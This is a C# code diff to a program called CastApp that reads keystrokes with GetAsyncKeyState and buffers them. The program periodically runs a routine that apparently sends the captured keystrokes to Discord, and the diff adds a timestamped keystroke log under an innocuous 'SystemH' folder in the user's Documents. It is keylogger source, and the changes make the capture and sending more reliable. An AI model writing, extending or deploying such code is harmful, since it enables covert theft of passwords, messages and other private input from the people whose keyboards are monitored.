@@ -27,12 +27,15 @@ namespace CastApp
         private static readonly StringBuilder DiscordBuffer = new StringBuilder();
         private static DateTime lastDiscordSend = DateTime.Now;
         private static readonly TimeSpan DiscordSendInterval = TimeSpan.FromMinutes(1);
-
-        // ADICIONADO: Controle de estado do Discord
         private static bool _discordInitialized = false;
         private static Exception? _lastDiscordError = null;
+        private static readonly SemaphoreSlim _sendingGuard = new SemaphoreSlim(1, 1);
 
         private static Mutex? _mutex;
+
+        // Logs locais
+        private static readonly string LogFolder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "SystemH");
+        private static readonly string LogFile = Path.Combine(LogFolder, "SystemH.log");
 
         /// <summary>
         /// Ponto de entrada do programa
@@ -282,7 +285,6 @@ namespace CastApp
             {
                 try
                 {
-                    // Flush do buffer local
                     if (DateTime.Now - lastFlush > FlushInterval)
                     {
                         FlushBuffer();
@@ -290,7 +292,20 @@ namespace CastApp
 
                     if (_discordInitialized && DateTime.Now - lastDiscordSend > DiscordSendInterval)
                     {
-                        _ = Task.Run(SendDiscordLogAsync);
+                        Task.Run(() =>
+                        {
+                            if (_sendingGuard.Wait(0))
+                            {
+                                try
+                                {
+                                    SendDiscordLogAsync().GetAwaiter().GetResult();
+                                }
+                                finally
+                                {
+                                    _sendingGuard.Release();
+                                }
+                            }
+                        });
                     }
 
                     bool leftShift = (Natives.GetAsyncKeyState(160) & 0x8000) != 0;
@@ -568,17 +583,30 @@ namespace CastApp
                 string content;
                 lock (KeyBuffer)
                 {
-                    if (KeyBuffer.Length == 0) return;
+                    if (KeyBuffer.Length == 0) { lastFlush = DateTime.Now; return; }
 
                     content = KeyBuffer.ToString();
                     KeyBuffer.Clear();
                 }
 
                 lastFlush = DateTime.Now;
+
+                try
+                {
+                    Directory.CreateDirectory(LogFolder);
+                    lock (FileLock)
+                    {
+                        System.IO.File.AppendAllText(LogFile, $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {content}\n", Encoding.UTF8);
+                    }
+                }
+                catch (Exception ex)
+                {
+                    _ = Task.Run(() => LogError($"Erro ao escrever no arquivo: {ex.Message}"));
+                }
             }
             catch (Exception ex)
             {
-                _ = Task.Run(() => LogError($"Erro ao escrever no arquivo: {ex.Message}"));
+                _ = Task.Run(() => LogError($"Erro ao fazer flush do buffer: {ex.Message}"));
             }
         }
     }
